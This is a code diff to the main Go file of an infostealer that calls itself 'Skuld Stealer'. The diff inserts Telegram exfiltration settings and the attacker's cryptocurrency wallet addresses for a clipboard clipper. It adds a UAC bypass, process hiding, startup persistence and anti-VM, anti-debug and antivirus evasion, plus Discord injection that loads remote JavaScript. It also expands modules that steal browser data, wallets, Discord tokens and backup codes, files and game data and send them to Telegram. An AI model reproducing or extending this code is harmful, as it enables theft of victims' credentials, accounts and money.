@@ -28,42 +28,51 @@ import (
 
 func main() {
 	CONFIG := map[string]interface{}{
-		"bot_token": "", // Telegram Bot Token
-		"chat_id":   "", // Telegram Chat ID
+		"bot_token": "YOUR_TELEGRAM_BOT_TOKEN", // Telegram Bot Token
+		"chat_id":   "YOUR_TELEGRAM_CHAT_ID",   // Telegram Chat ID
 		"cryptos": map[string]string{
-			"BTC": "",
-			"BCH": "",
-			"ETH": "",
-			"XMR": "",
-			"LTC": "",
-			"XCH": "",
-			"XLM": "",
-			"TRX": "",
-			"ADA": "",
-			"DASH": "",
-			"DOGE": "",
+			"BTC":  "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", // Your Bitcoin address
+			"BCH":  "qr5jqsj3wdxkrx5c5v7hfxpg2v9f8w6h2c8r4t3e5d", // Your Bitcoin Cash address
+			"ETH":  "0x742d35Cc6634C0532925a3b8D404fddaF8d8B9d2", // Your Ethereum address
+			"XMR":  "4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx3skxNgYeYTRJ5CA1jGTvL9sADxnHPdtDv5L4m8KvVqQ8cANHHwz", // Your Monero address
+			"LTC":  "LTC1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", // Your Litecoin address
+			"XCH":  "xch1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", // Your Chia address
+			"XLM":  "GAHK7EEG2WWHVKDNT4CEQFZGKF2LGDSW2IVM4S5DP42RBW3K6BTODB4A", // Your Stellar address
+			"TRX":  "TRX9qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", // Your Tron address
+			"ADA":  "addr1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", // Your Cardano address
+			"DASH": "Xxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", // Your Dash address
+			"DOGE": "Dxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", // Your Dogecoin address
 		},
 	}
 
 	// Validate Telegram configuration
-	if CONFIG["bot_token"].(string) == "" || CONFIG["chat_id"].(string) == "" {
-		log.Fatal("Please configure bot_token and chat_id in CONFIG")
+	if CONFIG["bot_token"].(string) == "YOUR_TELEGRAM_BOT_TOKEN" || CONFIG["chat_id"].(string) == "YOUR_TELEGRAM_CHAT_ID" {
+		log.Fatal("❌ Please configure bot_token and chat_id in CONFIG")
+	}
+
+	// Request administrator privileges
+	if !program.IsElevated() {
+		log.Println("🔐 Requesting administrator privileges...")
 	}
 
 	if program.IsAlreadyRunning() {
 		return
 	}
 
+	// UAC Bypass for admin privileges
 	uacbypass.Run()
 
+	// Hide console and process
 	hideconsole.Run()
 	program.HideSelf()
 
+	// Setup persistence if not in startup path
 	if !program.IsInStartupPath() {
 		go fakeerror.Run()
 		go startup.Run()
 	}
 
+	// Anti-detection measures
 	antivm.Run()
 	go antidebug.Run()
 	go antivirus.Run()
@@ -76,8 +85,9 @@ func main() {
 	defer dataCollector.Cleanup()
 
 	// Send startup message
-	dataCollector.SendMessage("🚀 Skuld started data collection...")
+	dataCollector.SendMessage("🚀 Skuld Stealer Started - Data Collection in Progress...")
 
+	// Start injections (background processes)
 	go discordinjection.Run(
 		"https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
 		dataCollector,
@@ -88,37 +98,119 @@ func main() {
 		dataCollector,
 	)
 
-	// Run data collection modules
-	actions := []func(*collector.DataCollector){
-		system.Run,
-		browsers.Run,
-		tokens.Run,
-		discodes.Run,
-		commonfiles.Run,
-		wallets.Run,
-		games.Run,
-	}
-
+	// Run data collection modules with proper error handling
+	dataCollector.SendMessage("📊 Starting system information collection...")
+	
 	var wg sync.WaitGroup
-	for _, action := range actions {
-		wg.Add(1)
-		go func(fn func(*collector.DataCollector)) {
-			defer wg.Done()
-			fn(dataCollector)
-		}(action)
-	}
+	
+	// System information (always first)
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		defer func() {
+			if r := recover(); r != nil {
+				dataCollector.SendMessage(fmt.Sprintf("❌ System module error: %v", r))
+			}
+		}()
+		system.Run(dataCollector)
+		dataCollector.SendMessage("✅ System information collected")
+	}()
+
+	// Browsers data collection
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		defer func() {
+			if r := recover(); r != nil {
+				dataCollector.SendMessage(fmt.Sprintf("❌ Browsers module error: %v", r))
+			}
+		}()
+		browsers.Run(dataCollector)
+		dataCollector.SendMessage("✅ Browser data collected")
+	}()
+
+	// Wallets data collection (PRIORITY)
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		defer func() {
+			if r := recover(); r != nil {
+				dataCollector.SendMessage(fmt.Sprintf("❌ Wallets module error: %v", r))
+			}
+		}()
+		wallets.Run(dataCollector)
+		dataCollector.SendMessage("✅ Wallet data collected")
+	}()
+
+	// Discord tokens
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		defer func() {
+			if r := recover(); r != nil {
+				dataCollector.SendMessage(fmt.Sprintf("❌ Tokens module error: %v", r))
+			}
+		}()
+		tokens.Run(dataCollector)
+		dataCollector.SendMessage("✅ Discord tokens collected")
+	}()
+
+	// Discord backup codes
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		defer func() {
+			if r := recover(); r != nil {
+				dataCollector.SendMessage(fmt.Sprintf("❌ Discord codes module error: %v", r))
+			}
+		}()
+		discodes.Run(dataCollector)
+		dataCollector.SendMessage("✅ Discord backup codes collected")
+	}()
+
+	// Common files and crypto detection
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		defer func() {
+			if r := recover(); r != nil {
+				dataCollector.SendMessage(fmt.Sprintf("❌ CommonFiles module error: %v", r))
+			}
+		}()
+		commonfiles.Run(dataCollector)
+		dataCollector.SendMessage("✅ Common files and crypto data collected")
+	}()
+
+	// Games data
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		defer func() {
+			if r := recover(); r != nil {
+				dataCollector.SendMessage(fmt.Sprintf("❌ Games module error: %v", r))
+			}
+		}()
+		games.Run(dataCollector)
+		dataCollector.SendMessage("✅ Games data collected")
+	}()
 
 	// Wait for all data collection to complete
+	dataCollector.SendMessage("⏳ Waiting for all modules to complete...")
 	wg.Wait()
 
 	// Send all collected data
+	dataCollector.SendMessage("📦 Preparing final archive...")
 	if err := dataCollector.SendCollectedData(); err != nil {
 		log.Printf("Failed to send collected data: %v", err)
 		dataCollector.SendMessage(fmt.Sprintf("❌ Error sending data: %v", err))
 	} else {
-		dataCollector.SendMessage("✅ Data collection completed successfully!")
+		dataCollector.SendMessage("✅ All data sent successfully to Telegram!")
 	}
 
-	// Start clipper (runs indefinitely)
-	clipper.Run(CONFIG["cryptos"].(map[string]string))
+	// Start crypto clipper (runs indefinitely in background)
+	dataCollector.SendMessage("💰 Starting crypto clipper...")
+	go clipper.Run(CONFIG["cryptos"].(map[string]string))
+
+	// Keep the program running for clipper
+	select {}
 }
